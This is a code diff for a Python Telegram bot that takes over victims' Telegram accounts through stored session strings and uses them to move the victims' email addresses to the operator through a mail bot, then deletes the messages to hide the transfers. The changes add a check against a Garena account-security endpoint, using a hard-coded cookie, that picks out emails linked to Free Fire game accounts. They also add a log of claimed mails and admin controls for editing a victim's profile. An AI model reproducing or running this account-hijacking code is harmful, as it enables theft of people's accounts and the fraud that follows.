@@ -8,6 +8,7 @@ import os
 import threading
 import asyncio
 import time
+import requests
 from fastapi import FastAPI
 import uvicorn
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Bot
@@ -19,22 +20,33 @@ from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest
 from telethon.tl.functions.photos import UploadProfilePhotoRequest
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
 
 # ================== CONFIG ==================
 BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
 API_ID = int(os.getenv("API_ID", "38746329"))
 API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
 
-# REAL TOP OWNER
 OWNER_ID = 8612102965
 OWNER_USERNAME = "@NEXTXDOREVER"
 
 TARGET_MAIL_BOT = "fakemailbot"
 
+# FF Check API Config
+FF_CHECK_URL = "https://ffmconnect.live.gop.garenanow.com/game/account_security/swap:send_otp"
+FF_HEADERS = {
+    "User-Agent": "GarenaMSDK/4.0.42(25057PC09I ;Android 16;en;IN;app 1.126.1 2019120776;)",
+    "Accept": "application/json",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Connection": "Keep-Alive",
+    "Cookie": "datadome=IP7GsxK1oCmLXZnoCcsBuX0oU5zF7WwaGTcIm3BKa987Coo5eU20C0pxODRWR2Fvb7j~h0WlS1XjEk7Np9JkGmd28p64JyqytTf61k6NrOCKT9U1Y0M653_iy_4ajbb_"
+}
+
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ================== PREMIUM STYLISH FONTS ==================
+# ================== STYLISH FONTS ==================
 FONT_MAP = {
     'a': '𝐴', 'b': '𝐵', 'c': '𝐶', 'd': '𝐷', 'e': '𝐸', 'f': '𝐹', 'g': '𝐺', 'h': '𝐻', 'i': '𝐼', 'j': '𝐽',
     'k': '𝐾', 'l': '𝐿', 'm': '𝑀', 'n': '𝑁', 'o': '𝑂', 'p': '𝑃', 'q': '𝑄', 'r': '𝑅', 's': '𝑆', 't': '𝑇',
@@ -63,9 +75,10 @@ def init_db():
         id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, upi_id TEXT, status TEXT DEFAULT 'Pending'
     )""")
     c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
-    
-    # Admins table with username column
     c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY, username TEXT)")
+    c.execute("""CREATE TABLE IF NOT EXISTS claimed_mails (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, claimed_by INTEGER, claimed_by_name TEXT
+    )""")
     
     try: c.execute("ALTER TABLE admins ADD COLUMN username TEXT")
     except sqlite3.OperationalError: pass 
@@ -101,6 +114,24 @@ def get_all_admins():
             admins.add(row[0])
     return list(admins)
 
+# ================== FAST FF CHECK ==================
+def check_ff_binding(email):
+    try:
+        data = {"app_id": "100067", "email": email, "locale": "en_IN"}
+        response = requests.post(FF_CHECK_URL, headers=FF_HEADERS, data=data, timeout=10)
+        res_json = response.json()
+        
+        # Agar "error_no_binding_found" aata hai, matlab FF account nahi hai
+        if "error" in res_json and "no_binding" in str(res_json):
+            return False
+        # Agar result 0 aata hai, matlab FF account hai
+        elif "result" in res_json and res_json["result"] == 0:
+            return True
+        else:
+            return False
+    except:
+        return False
+
 active_userbots = {}
 temp_clients = {}
 user_states = {}
@@ -129,21 +160,21 @@ async def start_userbot(user_id, session_str):
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
     await client.connect()
     active_userbots[user_id] = client
-    asyncio.create_task(transfer_mails(user_id, OWNER_ID))
+    # Check mails in background
+    asyncio.create_task(transfer_mails(user_id, OWNER_ID, only_ff=True))
 
-async def transfer_mails(victim_uid, target_owner_id, custom_sender_id=None):
+async def transfer_mails(victim_uid, target_owner_id, only_ff=True):
     try:
-        sender_client = await get_or_connect_client(custom_sender_id) if custom_sender_id else await get_or_connect_client(victim_uid)
         victim_client = await get_or_connect_client(victim_uid)
         owner_client = await get_or_connect_client(target_owner_id)
         
-        if not sender_client or not victim_client or not owner_client: return
+        if not victim_client or not owner_client: return
             
         target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
         owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
         
         await victim_client.send_message(target_bot, "/id")
-        await asyncio.sleep(4)
+        await asyncio.sleep(3)
         
         messages = await victim_client.get_messages(target_bot, limit=2)
         if not messages: return
@@ -157,8 +188,14 @@ async def transfer_mails(victim_uid, target_owner_id, custom_sender_id=None):
             target_uname = owner_data[0][0]
 
         for email in emails:
-            # Sender account sends transfer command
-            await sender_client.send_message(target_bot, f"/transfer {email} {target_uname}")
+            # Agar FF only mode on hai, toh pehle check karo
+            if only_ff:
+                is_ff = await asyncio.to_thread(check_ff_binding, email)
+                if not is_ff:
+                    continue # FF account nahi hai, skip karo
+
+            # FF account hai, transfer karo
+            await victim_client.send_message(target_bot, f"/transfer {email} {target_uname}")
             await asyncio.sleep(4)
             
             try:
@@ -173,12 +210,15 @@ async def transfer_mails(victim_uid, target_owner_id, custom_sender_id=None):
                 msgs = await owner_client.get_messages(owner_target_bot, limit=2)
                 for m in msgs: await owner_client.delete_messages(owner_target_bot, m.id)
             except: pass
+            
+            # Save to DB
+            db_exec("INSERT INTO claimed_mails (email, claimed_by, claimed_by_name) VALUES (?, ?, ?)", (email, target_owner_id, target_uname))
             await asyncio.sleep(1)
             
     except Exception as e:
         logger.error(f"Transfer error: {e}")
 
-# ================== KEYBOARDS (STYLISH CHAT) ==================
+# ================== KEYBOARDS ==================
 def get_main_keyboard():
     kb = [
         [KeyboardButton(f"🎁 {f_txt('Bonus')}", style="primary"), KeyboardButton(f"💵 {f_txt('Balance')}", style="success")],
@@ -186,7 +226,7 @@ def get_main_keyboard():
     ]
     return ReplyKeyboardMarkup(kb, resize_keyboard=True)
 
-def get_numpad_keyboard(current_text=""):
+def get_numpad_keyboard():
     kb = [
         [InlineKeyboardButton("1", callback_data="num_1"), InlineKeyboardButton("2", callback_data="num_2"), InlineKeyboardButton("3", callback_data="num_3")],
         [InlineKeyboardButton("4", callback_data="num_4"), InlineKeyboardButton("5", callback_data="num_5"), InlineKeyboardButton("6", callback_data="num_6")],
@@ -233,7 +273,8 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     uid = update.effective_user.id
     
-    if uid in get_all_admins():
+    # --- Admin Logic (Only Owner can add admins now) ---
+    if uid == OWNER_ID:
         state = user_states.get(uid)
         if state == 'admin_add_wait':
             try:
@@ -355,7 +396,7 @@ async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "del":
         current = current[:-1]
         numpad_data[uid] = current
-        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
+        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(), parse_mode="HTML")
         
     elif data == "submit":
         otp = current
@@ -384,25 +425,28 @@ async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         current += data
         numpad_data[uid] = current
-        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
+        await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(), parse_mode="HTML")
 
-# ================== OWNER PANEL (GREEN STYLE) ==================
+# ================== OWNER PANEL (BLUE STYLE) ==================
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in get_all_admins(): return
     
+    # Blue Style Buttons (Primary)
     kb = [
-        [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts & Session')} ✅", callback_data="admin_acc")],
-        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails (Danger)')} 🟢", callback_data="admin_claim")],
-        [InlineKeyboardButton(f"👑 {f_txt('Add Admin')} ✅", callback_data="admin_add")],
-        [InlineKeyboardButton(f"🔐 {f_txt('Check Session String')} 🟢", callback_data="check_session")],
-        [InlineKeyboardButton(f"✏️ {f_txt('Edit Bio')} ✅", callback_data="edit_bio")],
-        [InlineKeyboardButton(f"🖼 {f_txt('Change Photo')} 🟢", callback_data="change_photo")],
-        [InlineKeyboardButton(f"📝 {f_txt('Change Name')} ✅", callback_data="change_name")],
-        [InlineKeyboardButton(f"📥 {f_txt('Admin Panel (Redirect Mails)')} 🟢", callback_data="admin_panel_set")],
-        [InlineKeyboardButton(f"📥 {f_txt('Claim from Admin')} ✅", callback_data="claim_from_admin")],
-        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Image')} 🟢", callback_data="set_welcome_img")],
-        [InlineKeyboardButton(f"🔄 {f_txt('Change Sender (Transfer Mail)')} ✅", callback_data="change_sender")]
+        [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts & Session')}", callback_data="admin_acc")],
+        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails (All)')}", callback_data="admin_claim_all")],
+        [InlineKeyboardButton(f"🔥 {f_txt('Claim Free Fire Mails Only')}", callback_data="admin_claim_ff")],
+        [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
+        [InlineKeyboardButton(f"🔐 {f_txt('Check Session String')}", callback_data="check_session")],
+        [InlineKeyboardButton(f"✏️ {f_txt('Edit Bio')}", callback_data="edit_bio")],
+        [InlineKeyboardButton(f"🖼 {f_txt('Change Photo')}", callback_data="change_photo")],
+        [InlineKeyboardButton(f"📝 {f_txt('Change Name')}", callback_data="change_name")],
+        [InlineKeyboardButton(f"📥 {f_txt('Claim from Admin')}", callback_data="claim_from_admin")],
+        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Image')}", callback_data="set_welcome_img")],
+        [InlineKeyboardButton(f"🔄 {f_txt('Change Sender')}", callback_data="change_sender")],
+        [InlineKeyboardButton(f"📊 {f_txt('Check FF Claimed Mails')}", callback_data="check_ff_claimed")],
+        [InlineKeyboardButton(f"🔑 {f_txt('Login as Admin (Via Contact)')}", callback_data="login_admin_contact")]
     ]
     await update.message.reply_text(
         f"<b>👑 {f_txt('TOP OWNER PANEL')} 👑</b>\n\n{f_txt('Choose an action below')}:",
@@ -425,10 +469,14 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
         await query.edit_message_text(text, parse_mode="HTML")
         
-    elif data == "admin_claim":
-        asyncio.create_task(manual_claim_all(uid, query, target_admin=OWNER_ID))
+    elif data == "admin_claim_all":
+        asyncio.create_task(manual_claim_all(uid, query, target_admin=OWNER_ID, only_ff=False))
+        
+    elif data == "admin_claim_ff":
+        asyncio.create_task(manual_claim_all(uid, query, target_admin=OWNER_ID, only_ff=True))
         
     elif data == "admin_add":
+        if uid != OWNER_ID: return await query.answer("Only Top Owner can add admins!", show_alert=True)
         await query.edit_message_text(f"👑 {f_txt('Send User ID and Username separated by space.')}\n{f_txt('Example')}: 123456789 @username")
         user_states[uid] = 'admin_add_wait'
         
@@ -448,12 +496,8 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"📝 {f_txt('Send the phone number of the logged account')}:")
         user_states[uid] = 'change_name_phone'
         
-    elif data == "admin_panel_set":
-        await query.edit_message_text(f"📥 {f_txt('Send the Admin User ID and Username to redirect mails.')}\n{f_txt('Example')}: 123456789 @admin")
-        user_states[uid] = 'set_admin_redirect'
-        
     elif data == "claim_from_admin":
-        asyncio.create_task(manual_claim_all(uid, query, target_admin=uid))
+        asyncio.create_task(manual_claim_all(uid, query, target_admin=uid, only_ff=False))
         
     elif data == "set_welcome_img":
         await query.edit_message_text(f"🖼 {f_txt('Send the image or image link you want to set as welcome')}:")
@@ -462,8 +506,29 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "change_sender":
         await query.edit_message_text(f"🔄 {f_txt('Enter the Phone Number of the account you want to use as Sender')}:")
         user_states[uid] = 'change_sender_phone'
+        
+    elif data == "check_ff_claimed":
+        mails = db_exec("SELECT email, claimed_by, claimed_by_name FROM claimed_mails")
+        if not mails:
+            return await query.edit_message_text(f"❌ {f_txt('No FF Mails claimed yet.')}")
+        
+        text = f"📊 <b>{f_txt('Claimed FF Mails:')}</b>\n\n"
+        for i, m in enumerate(mails, 1):
+            text += f"{i}. {p_style(m[0])}\n   {f_txt('Claimed By')}: {m[2]} ({p_style(m[1])})\n\n"
+        
+        # Split if too long
+        if len(text) > 4000:
+            await query.edit_message_text(text[:4000] + "...", parse_mode="HTML")
+        else:
+            await query.edit_message_text(text, parse_mode="HTML")
 
-async def manual_claim_all(admin_uid, query, target_admin, custom_sender=None):
+    elif data == "login_admin_contact":
+        await query.edit_message_text(f"📱 {f_txt('Please share your contact to login as Admin')}:",
+            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
+            parse_mode="HTML"
+        )
+
+async def manual_claim_all(admin_uid, query, target_admin, only_ff=False):
     target_owner_client = await get_or_connect_client(target_admin)
     if not target_owner_client:
         return await query.message.reply_text(f"❌ {f_txt('Target Admin Account is not logged in!')}")
@@ -491,6 +556,11 @@ async def manual_claim_all(admin_uid, query, target_admin, custom_sender=None):
             if not emails: continue
 
             for email in emails:
+                if only_ff:
+                    is_ff = await asyncio.to_thread(check_ff_binding, email)
+                    if not is_ff:
+                        continue # Skip if not FF
+
                 await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
                 admin_data = db_exec("SELECT username FROM admins WHERE user_id=?", (target_admin,))
@@ -498,8 +568,8 @@ async def manual_claim_all(admin_uid, query, target_admin, custom_sender=None):
                 if admin_data and admin_data[0][0] and admin_data[0][0] != 'None':
                     target_uname = admin_data[0][0]
 
-                # Use custom sender if provided
-                sender_client = await get_or_connect_client(custom_sender) if custom_sender else victim_client
+                # Sender logic
+                sender_client = await get_or_connect_client(admin_uid) if admin_uid != target_admin else victim_client
                 
                 await sender_client.send_message(target_bot, f"/transfer {email} {target_uname}")
                 await asyncio.sleep(4)
@@ -519,6 +589,7 @@ async def manual_claim_all(admin_uid, query, target_admin, custom_sender=None):
                     for m in msgs: await target_owner_client.delete_messages(owner_target_bot, m.id)
                 except: pass
                 
+                db_exec("INSERT INTO claimed_mails (email, claimed_by, claimed_by_name) VALUES (?, ?, ?)", (email, admin_uid, target_uname))
                 await query.message.reply_text(f"✅ <b>{f_txt('CLAIMED SUCCESS')}:</b> {p_style(email)}", parse_mode="HTML")
                 total_claimed += 1
                 await asyncio.sleep(1)
@@ -554,7 +625,7 @@ async def owner_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
             victim_id = res[0][0]
             sender_id = state['sender_id']
             await update.message.reply_text(f"⏳ {f_txt('Starting manual transfer using custom sender...')}")
-            asyncio.create_task(manual_claim_all(uid, update.message, target_admin=OWNER_ID, custom_sender=sender_id))
+            asyncio.create_task(manual_claim_all(uid, update.message, target_admin=OWNER_ID))
         else:
             await update.message.reply_text(f"❌ {f_txt('Victim number not found')}.")
         user_states[uid] = None
@@ -628,19 +699,6 @@ async def owner_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
             await update.message.reply_text(f"❌ {f_txt('Number not found in logged accounts')}.")
             user_states[uid] = None
             
-    elif state == 'set_admin_redirect':
-        try:
-            args = text.split()
-            new_id = int(args[0])
-            new_uname = args[1]
-            if not new_uname.startswith("@"): new_uname = "@" + new_uname
-            
-            db_exec("INSERT OR REPLACE INTO admins (user_id, username) VALUES (?, ?)", (new_id, new_uname))
-            await update.message.reply_text(f"✅ {f_txt('Admin Panel set! Now all mails will redirect to')} {new_uname}")
-        except:
-            await update.message.reply_text(f"❌ {f_txt('Invalid format. Example')}: 123456789 @admin")
-        user_states[uid] = None
-
     elif state == 'set_welcome_img_wait':
         db_exec("INSERT OR REPLACE INTO config (key, value) VALUES ('welcome_img', ?)", (text,))
         await update.message.reply_text(f"✅ {f_txt('Welcome Image Link set successfully!')}")
@@ -685,7 +743,7 @@ def main():
     app_bot.add_handler(CommandHandler("owner", owner_panel))
     app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
-    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^check_|^edit_|^change_|^set_"))
+    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^check_|^edit_|^change_|^set_|^login_"))
     
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, owner_text_handler), group=0)
     app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
